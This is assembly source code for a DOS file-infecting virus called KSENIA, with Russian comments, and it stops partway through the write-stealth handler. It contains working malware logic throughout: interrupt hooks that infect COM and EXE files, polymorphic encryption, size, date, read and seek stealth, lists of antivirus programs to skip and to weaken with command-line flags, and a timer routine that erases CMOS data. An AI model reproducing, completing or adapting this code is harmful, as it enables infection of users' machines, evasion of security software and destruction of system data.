 comment ъ

                KSENIA Virus Version 1.0 Copyright (C) Deadman
              └────────────────────────────────────────────────┘

 TSR/COM/EXE fast polymorphic infector
  Infects on 1857h/3Dh/41h/43h/4Bh/56h/6Ch/7141h/7143h/7156h/716Ch/71A9h
     (Internal/Open/Del/Chmod/Exec/Ren/ExtOpen/LFNs/LFN Server Open)
  Size/Date stealth on 11h/12h/4Eh/4Fh/5700h/5701h/714Eh/714Fh/71A6h
     (Find First/Next FCB/DTA/LFN + Get/Set File Time/Date + Get Handle Info)
  Redirection stealth on 3Fh/42h (Read/LSeek)
  SFT stealth without using any SFT values (for Novell/Win95 compatibility)
  Disinfects the host on 40h (Write)
  Re-Hooks Int 21h vector after Win95 installation. Works perfectly!
  Re-Hooks Int 21h vector if virus handler has been removed from the chain
  Every second it calcucates CRC32 and erases CMOS if the CRC is incorrect
  Virus stays resident in low memory, executing the host with 4B00h function
  When some of AVs are executing, virus adds some parameters to cmdline
  Polymorphic in files uses its internal polymorphic engine
  Engine uses table-based instructions as a random size garbage (85% of 8086)
  Engine uses different count and index registers
  Generates different decryptors (ADD/SUB/XOR/NOT/NEG/ROR/ROL/INC/DEC imm8)
  Has a second internal shield (secondary encrypts itself with a kewl method)
  Will not infect files with a current hour stamp
  Filenames with digits will not be infected
  Will not infect AVP/DrWeb/Web/F-Prot/TB/ADInf/Clean/Scan/NOD/VSafe/Anti/NAV/FV/FindViru/Command
  Disable stealth if PkZip/RAR/ARJ/LHA/ARC/DEFRAG/SPEEDISK/CHKDSK/BACKUP/MSBACKUP/ScanDisk/NDD are running
  Intercepts Int 24h to disallow user be warned by a critial error message
  Virus was analysed by these AVs
      AVP 3.0.130 - No detection or warns
      DRWEB 4.11  - No detection or warns
      F-PROT 3.05 - No detection or warns

                                 Deadman from hell. E-Mail: dman@mail.ru ъ

 vsize  equ     eov-ksenia      ; дисковая память для вируса
 msize  equ     eom-ksenia      ; размер памяти требуемой вирусу
 crlen  equ     256             ; размер расшифровщика

 B      equ     <byte ptr>      ; некоторые сокращения
 W      equ     <word ptr>
 D      equ     <dword ptr>

 mvs    macro   Seg1,Seg2       ; макрос
        push    Seg2            ; mvs es,cs -> push cs/pop es
        pop     Seg1
        endm

        model   tiny            ; ШАПКА
        codeseg
        p386
        org     100h
 ksenia:
        xor     bp,bp           ; нужно для 1-го запуска вируса
        call    crc             ; подсчет CRC вируса
        cmp     checksum,eax    ; сравнение CRC32
        je      shield          ; эти CRLEN байт зарезервированы в теле

        lea     di,r_crc
        mov     cx,4
 trans: rol     eax,8
        push    ax
        call    hex2a
        stosw
        pop     ax
        loop    trans

        mov     ah,9            ; вируса для полиморфного расшифровщика
        lea     dx,badcrc
        int     21h
        mov     ax,4c02h
        int     21h

 hex2a: aam     10h
        add     ax,3030h
        cmp     al,':'
        jb      $+4
        add     al,7
        xchg    al,ah
        cmp     al,':'
        jb      $+4
        add     al,7
        ret

 badcrc db      'Virus code has been modified. The correct CRC is '
 r_crc  db      '00000000h',0dh,0ah,24h

        org     ksenia+CRLEN

        cld
        mov     ah,30h          ; запрос версии ДОС, но это только для
        int     21h             ; виду. На самом деле берем из стека
 ip:    mov     bp,sp
        mov     bp,[bp-6]       ; сохраненное IP командой INT и
        sub     bp,offset ip    ; вычисляем разность смещений (delta)

        push    ds 0ffffh       ; так я обломал эмулятор web'а
        pop     ds
        mov     al,ds:[7]       ; читаем байт из ROM
        pop     ds              ; обычно в этом месте хранится дата
        xor     al,2fh          ; и вирус читает slash из этой даты
        cbw                     ; AX=00
        inc     ax              ; AX=01
        mov     dx,ax           ; DX=01

        lea     si,original-1+bp ; второе (внутреннее) кольцо защиты вируса
        mov     cx,original-shield-1
 turbo: mov     al,cs:[si]      ; краткая структура:
        add     cs:[si-1],al    ; ДО:    byte1 byte2 byte3 byte4
        sub     si,dx           ; ПОСЛЕ: b1+b2 b2+b3 b3+b4 b4+b5
        loop    turbo

 shield:
        mov     ax,1856h        ; проверка на присутствие вируса в памяти
        int     21h             ; AH=18 - пустая функция
        cmp     ax,3265h        ; AX=3265 - значит, что копия вируса уже в
        jne     install         ; памяти

        lea     si,original+bp  ; si-сохраненное начало хоста
        mov     ax,cs:[si]
        cmp     ax,'MZ'         ; откуда запустили вирус?
        je      run_exe         ; если начинается на 'MZ' или 'ZM'
        cmp     ax,'ZM'         ;  -> из EXE
        je      run_exe         ; иначе из СОМ

        mov     di,0100h        ; стартовали из СОМ
        mov     cx,32
        rep     movsb           ; восстановить в памяти
        mov     si,100h         ; начало зараженного файла
        mov     dx,cs
        jmp     restp

 run_exe:
        mov     ax,es
        add     ax,010h
        add     cs:[si+16h],ax  ; старое CS
        add     ax,cs:[si+0eh]  ; старое SS
        mov     dx,cs:[si+10h]  ; старое SP
        mov     ss,ax
        mov     sp,dx
        mov     dx,cs:[si+16h]  ; CS
        mov     si,cs:[si+14h]  ; IP

 restp: push    dx si
        xor     ax,ax           ; восстановить регистры
        xor     bx,bx
        mov     cx,0ffh
        mov     dx,ds
        mov     di,sp
        add     di,4
        mov     bp,912h
        retf                    ; отдать управление программе

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Инсталляция вируса в память
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 install:
        mov     di,100h         ; ES:DI = PSP:0100
        mvs     ds,cs           ; DS:SI = код вируса
        lea     si,ksenia+bp    ; копируем код вируса поверх зараженной
        mov     cx,msize        ; программы сразу после PSP
        db      6ah,00h         ; загружаем в стек команды для
        db      66h,68h         ; копирования вируса
        db      0f3h,0a4h,0cah,6
        push    es offset done  ; rep movsb / retn 6
        mov     ax,sp
        add     ax,4
        cld
        jmp     far ptr ax

 done:  mov     ax,cs           ; мы на новом месте, с правильным
        mov     ds,ax           ; смещением, как при компиляции
        mov     seg0,ax         ; заполнение сегментных полей в EPB
        mov     seg1,ax
        mov     seg2,ax

        call    WinOldAp        ; получение статуса инсталляции WinOldAp
        mov     w95state,ax     ; сохранение флажка

        mov     ax,3521h        ; AH=35 AL=INT# - функция для получения
        int     21h             ; вектора прерывания AL
        mov     io21p,bx        ; сохранить вектор в ячейке памяти
        mov     io21p+2,es
        call    set_dup         ; установить 21-й вектор прерывания на другой
        mov     ax,2521h        ; установить свой обработчик
        lea     dx,handler      ; прерывания
        int     21h
        mov     ax,3508h        ; запрос вектора прерывания
        int     21h
        mov     io08,bx         ; сохранение вектора в ячейках памяти
        mov     io08+2,es
        mov     ax,2508h        ; установка прерывания 08h (таймер)
        lea     dx,vguard       ; для проверки целостности кода
        int     21h

        call    FixVirus        ; заражение некоторых важных файлов

        mov     ah,4ah          ; уменьшить до нужного размера блок
        mov     bx,(msize+100h)/16+2 ; памяти, выделенный программе
        mvs     es,cs
        int     21h

        mov     si,2ch          ; PSP:2Ch = сегмент окружения
        mov     ds,[si]         ; поместить его в DS
        xor     ax,ax
        mov     si,-1

 escan: inc     si              ; сканним пока не найдем DW 0
        cmp     W [si],ax       ; за ним следует имя файла (программы),
        jne     escan           ; из которой был запушен вирус
        lea     dx,[si+4]       ; dx -> имя

        mov     ax,cs           ; проинициализируем стековые указатели
        mov     ss,ax           ; а то они болтаются где-то внизу //
        lea     sp,stacks+size stacks

        mov     ax,4b00h        ; запускаем носителя
        lea     bx,epb          ; ES:BX = EPB
        int     21h

        mov     si,2ch
        mov     es,cs:[si]      ; получение сегмента окружения
        mov     ah,49h          ; освобождение блока памяти
        int     21h

        mov     ax,cs           ; маскируем наш блок памяти так, как будто
        dec     ax              ; он содержит только наш PSP. А под себя
        mov     ds,ax           ; построим другой блок памяти, следующий
        xor     si,si           ; прямо за PSP. При завершении программы
        mov     al,4dh          ; наш блок памяти не будет освобожен.
        xchg    B [si],al
        mov     W [si+3],0fh    ; Память под MCB нам любезно предоставлена
        mov     B [si+100h],al  ; командной строкой (PSP+0F0h)
        mov     W [si+101h],8   ;
        mov     W [si+103h],msize/16+2

        mov     ah,4dh          ; AH=4Dh (WAIT)
        int     21h             ; получить ErrorLevel запущенной программы
        mov     ah,4ch          ; AH=4Ch (EXIT)
        int     21h             ; выйти в DOS без всяких подозрений

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Область данных
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

 copyright    db      'Ksenia.'
              db      vsize/1000 mod 10+'0'
              db      vsize/100  mod 10+'0'
              db      vsize/10   mod 10+'0'
              db      vsize      mod 10+'0'
              db      ' Version 1.0 Copyright (C) by Deadman',0

 v_id         db      '[KSENIA/Deadman]',0
 ssize        equ     $-v_id

 extens       db      '.com',0  ; расширения файлов, которые мы
              db      '.exe',0  ; инфицируем
              db      0

 prms         db      'DRWEB' ,0,0,' /NM'   ,0dh
              db      'F-PROT',0,0,' /NOMEM',0dh
              db      'AVP'   ,0,0,' /M'    ,0dh
              db      0

 AVs          db      'AVP',0   ; их вирус трогать не будет
              db      'DrWeb',0
              db      'Web',0
              db      'F-Prot',0
              db      'TB',0
              db      'ADInf',0
              db      'Clean',0
              db      'Scan',0
              db      'NOD',0
              db      'VSafe',0
              db      'Anti',0
              db      'NAV',0
              db      'FV',0
              db      'FindViru',0
              db      'Command',0
              db      0

 windir       db      'WINBOOTDIR=',0,0
 comspec      db      'COMMAND',0,0

 fixes        db      '\SYSTEM\CONAGENT.EXE',0
              db      '\COMMAND\MODE.COM',0
              db      0

 stlock       db      'PkZip',0 ; программы, во время работы которых
              db      'RAR',0   ; отключаются стелс-функции вируса
              db      'ARJ',0
              db      'LHA',0
              db      'ARC',0
              db      'ZOO',0
              db      'DEFRAG',0
              db      'SPEEDISK',0
              db      'ChkDsk',0
              db      'BACKUP',0
              db      'MSBACKUP',0
              db      'ScanDisk',0
              db      'NDD',0
              db      0

 funcs        dw      1856h,tsrtest     ; проверка зараженности памяти (NULL)
              dw      4AFFh,rehook      ; re-перехват вектора (SETBLOCK)

              dw      3DFFh,infect      ; заражение (OPEN)
              dw      1857h,infect      ; заражение (VIXFIRUS)
              dw      41FFh,infect      ; заражение (DEL)
              dw      43FFh,infect      ; заражение (CHMOD)
              dw      4BFFh,infect      ; заражение (EXEC)
              dw      56FFh,infect      ; заражение (REN)
              dw      6C00h,extinfect   ; заражение (EXTOPEN)
              dw      7141h,lfninfect   ; заражение (LFN DEL)
              dw      7143h,lfninfect   ; заражение (LFN CHMOD)
              dw      7156h,lfninfect   ; заражение (LFN REN)
              dw      716Ch,extlfninf   ; заражение (LFN OPEN)
              dw      71A9h,extlfninf   ; заражение (LFN SERVER OPEN)

              dw      11FFh,fcbstealth  ; стелс (FCB)
              dw      12FFh,fcbstealth  ; стелс (FCB)
              dw      4EFFh,dtastealth  ; стелс (DTA)
              dw      4FFFh,dtastealth  ; стелс (DTA)
              dw      714Eh,lfnstealth  ; стелс (LFN)
              dw      714Fh,lfnstealth  ; стелс (LFN)
              dw      71A6h,infstealth  ; стелс (LFN HANDLE INFO)
              dw      5700h,date_get    ; стелс (GET DATE)
              dw      5701h,date_set    ; стелс (SET DATE)
              dw      42FFh,seekstealth ; стелс (LSEEK)
              dw      3FFFh,readstealth ; стелс (READ)
              dw      40FFh,diswrite    ; стелс (WRITE)

              dw      3EFFh,patchsft    ; корректировка SFT
              dw      44FFh,patchsft    ; корректировка SFT
              dw      45FFh,patchsft    ; корректировка SFT
              dw      46FFh,patchsft    ; корректировка SFT
              dw      68FFh,patchsft    ; корректировка SFT
              dw      0


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 08 (Virus Guard)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 vguard:
        call    SaveRegs        ; сохранение регистров
        inc     cs:delay        ; проверка будет происходить примерно
        cmp     cs:delay,18     ; каждую секунду
        jb      exit_guard
        mov     cs:delay,0
        call    crc             ; подсчет CRC теля вируса
        cmp     cs:checksum,eax ; сравнение ее с эталонной
        jz      crc_ok

        mov     al,0ffh         ; запрещение всех прерываний
        out     21h,al

        mov     cx,40h          ; затираем данные CMOS
 cmos:  mov     ax,cx
        out     71h,al
        jmp     $+2
        out     70h,al
        loop    cmos
        jmp     $

 crc_ok:
        mov     ax,1856h        ; проверяем, никто ли не выкидывал наш
        int     21h             ; обработчик 21-го прерывания из общей
        cmp     ax,3265h        ; цепи?
        je      exit_guard

        mov     ax,3521h        ; запрос вектора int 21h
        int     21h
        call    set_dup         ; установить 21-й вектор прерывания на другой
        lea     dx,manager      ; здесь нужно переустановить вектор
        call    chk_dup         ; находим место, куда указывал вектор
        jnz     reset           ; в последние годы своей жизни
        lea     dx,handler
 reset: mov     ax,2521h        ; переустанавливаем вектор
        mvs     ds,cs
        int     21h

 exit_guard:
        call    LoadRegs
        jmp     d cs:io08

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 21
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 handler:
        call    chk_dup         ; проверка, не переустановили ли вектор
        jz      manager         ; это бывает после загрузки Win95
        jmp     D cs:io21p      ; иначе мы тут ни при чем

 manager:
        call    SaveRegs        ; сохранить все регистры

        mov     cs:save_ax,ax   ; соохранение параметров
        mov     cs:save_bx,bx   ; будут использоваться (Filename), если
        mov     cs:save_es,es   ; функция = 4b00 и заппускаемый файл - AV

        lea     si,funcs        ; есть табличка, по которой обрабатываются
 fscan: cmp     ah,cs:[si+1]    ; нужные функции int 21 (db F#, dw offset)
        jne     lnext           ; сравниваем al с текущей ячейкой таблицы
        cmp     B cs:[si],0ffh  ; проверка на ненужность проверки подфункции
        je      ljump
        cmp     B cs:[si],al    ; проверка подфункции
        jne     lnext

 ljump: call    mcbcheck        ; функция найдена: проверка MCB (для stealth)
        push    W cs:[si+2]     ; берем смещение обработчика для функции
        jmp     LoadRegs        ; восстанавливаем регистры

 lnext: add     si,4            ; берем следующую запись из таблицы
        cmp     w cs:[si],0     ; проверка конца таблицы
        jnz     fscan
        call    LoadRegs        ; обработчик для этой функции так и не
        jmp     ExitHandler     ; найден: отдаем управление

 exithandler:
        push    ax ax es bx bp  ; сохранение ES:BX и резервирование места
        call    get_dup         ; получение оригинального вектора int 21h
        mov     bp,sp
        mov     [bp+6],bx       ; занос вектора в две свободные ячейки
        mov     [bp+8],es       ; в стеке
        pop     bp bx es        ; восстановление регистров ES:BX
        retf                    ; передача управления DOS

 ireturn:
        retf    2               ; возврат с уничтожением флагов в стеке

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Заражение файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 extlfninf:
        call    SaveRegs        ; сохранить в стеке регистры
        mov     dx,si
        jmp     lfnbreak

 lfninfect:
        call    SaveRegs        ; сохранить в стеке регистры

 lfnbreak:
        call    Hook24          ; установка 24-го вектора прерывания
        call    Filename        ; проверка имени и расширения файла
        jc      noinf
        call    LFNClrAttrib    ; очистка аттрибутов файла
        jc      noinf
        call    LFNOpenFile     ; открытие файла для R/W
        jc      LFNga
        call    Infect_Handle   ; инфицирование handle
        call    CloseFile       ; закрытие файла
 LFNga: call    LFNRestAttrib   ; восстановление аттрибутов файла
        jmp     noinf

 extinfect:
        call    SaveRegs        ; сохранить в стеке регистры
        mov     dx,si
        jmp     break
 infect:
        call    SaveRegs        ; сохранить в стеке регистры
 break: call    Hook24          ; установка 24-го вектора прерывания
        call    Filename        ; проверка имени и расширения файла
        jc      noinf
        call    ClrAttrib       ; очистка аттрибутов файла
        jc      noinf
        call    OpenFile        ; открытие файла для R/W
        jc      RAttr
        call    Infect_Handle   ; инфицирование handle
        call    CloseFile       ; закрытие файла
 Rattr: call    RestAttrib      ; восстановление аттрибутов файла
 Noinf: call    Remove24        ; восстановление обработчика int 24h
        call    LoadRegs        ; восстановление регистров
        cmp     ah,3dh
        je      sftstealth
        cmp     ax,6c00h
        je      sftstealth
        jmp     exithandler

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SFT stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sftstealth:
        call    int21           ; открыть нужный файл
        call    SaveRegs        ; сохранение регистров
        jc      no_sft
        xchg    ax,bx
        call    CloseSFT        ; закрыть SFT
 no_sft:
        call    LoadRegs
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; FCB stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 fcbstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        cmp     al,0ffh         ; найдено что-нибудь?
        jz      no_fcb
        cmp     cs:stf,0        ; работать можно?
        jnz     no_fcb
        cmp     cs:command,0    ; это запрос command.com'а?
        jnz     no_fcb

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        cmp     B es:[bx],0ffh  ; расширенное FCB?
        jne     usual
        add     bx,7
 usual: lea     si,[bx+14h]     ; si -> дата файла
        lea     di,[bx+1Dh]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_fcb:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DTA stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 dtastealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_dta          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_dta

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        lea     si,[bx+18h]     ; si -> дата файла
        lea     di,[bx+1ah]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_dta:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Win95 stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 infstealth:
        stc                     ; CF должен быть установлен
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; все ok?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,0            ; время в Win95 формате
        mov     si,dx
        lea     di,[si+24h]     ; размер файла
        lea     si,[si+14h]     ; дата файла
        mvs     es,ds
        jmp     allw95

 lfnstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,si           ; формат времени
        lea     si,[di+14h]     ; дата файла
        lea     di,[di+20h]     ; размер файла

 allw95:
        cmp     ax,1            ; проверка формата времени
        jz      dos_date

        push    si di ax        ; сохранение параметров на будующее
        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,0            ; Win95 в формат DOS
        mvs     ds,es           ; SI указывает на дату
        call    int21           ; сейчас CX:DX содержат обычное DOS время
        pop     ax di si        ; восстановление параметров
        mov     [si],cx         ; сохранение параметров в FindDataRecord
        mov     [si+2],dx

 dos_date:
        add     si,2            ; si -> дата файла
        call    sizst           ; di -> длина файла
        sub     si,2

        cmp     ax,1            ; проверка формата времени
        jz      no_win

        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,1            ; DOS в формат Win95
        mov     di,si           ; DI -> buffer для времени и даты
        mov     cx,[di]         ; чтение времени и даты в формате DOS
        mov     dx,[di+2]
        call    int21           ; сейчас ES:[DI] содержит время Win95

 no_win:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DATE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 date_get:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    int21           ; запрос даты
        call    hidestm         ; маскировка даты
        clc
        jmp     seek_ret

 date_set:
        call    OpenSFT         ; открыть SFT
        call    int21           ; установка даты
        call    correctdate     ; правка даты
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; LSEEK stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    HandleCheck     ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        push    cx              ; сохранение CX
        cmp     al,2            ; проверка типа
        jne     forw
        sub     dx,vsize        ; маскировка настоящего конца файла
        sbb     cx,0            ; сдвиг идет от головы вируса
 forw:  call    int21           ; здесь установка указателя идет от начала
        pop     cx              ; восстановление CX
        jc      seek_ret        ; или от текущей позиции
        call    seekhide        ; блокировка попадания lseek на тело вируса
        mov     ax,cs:seek_pos
        mov     dx,cs:seek_pos+2
        jmp     seek_ret

 no_seek:
        call    int21           ; вызов DOS
 seek_ret:
        call    CloseSFT        ; закрыть SFT
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; READ stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 readstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    HandleCheck     ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SeekSave        ; сохранение позиции указателя
        call    int21           ; запрос чтения данных
        jc      seek_ret
        call    SaveRegs        ; сохранение регистров
        mov     di,dx           ; дублирование смещения буфера
        mov     cs:nrbytes,ax   ; количество прочитанных байт

        cmp     D cs:seek_pos,32 ; читают заголовок?
        jae     zone
        call    crload          ; прочитать настоящее начало файла

        lea     si,buffer       ; SI -> настоящее начало
        add     si,cs:seek_pos  ; SI -> с учетем смещения чтения

        mov     cx,cs:nrbytes   ; считаем количество байт которые нам нужно
        add     cx,cs:seek_pos  ; состелсить
        cmp     cx,32           ; позиция конца чтения лежит за пределом
        jbe     $+5             ; сохраненного начала файла?
        mov     cx,32
        sub     cx,cs:seek_pos

        jcxz    zone            ; в случае чтения 0 байт
 rhide: mov     al,cs:[si]      ; подмена инфицированного начала файла на
        mov     [di],al         ; оригинальное
        inc     si
        inc     di
        loop    rhide

 zone:  call    seekhide        ; блокируем возможность попадания lseek на
        call    LoadRegs        ; зону вируса + уменьшения числа прочитанных
        mov     ax,cs:nrbytes   ; байт
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; ALL HANDLER stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 patchsft:
        call    OpenSFT         ; открыть SFT
        jmp     no_seek

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; WRITE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 diswrite:
        call    OpenSFT         ; открыть SFT
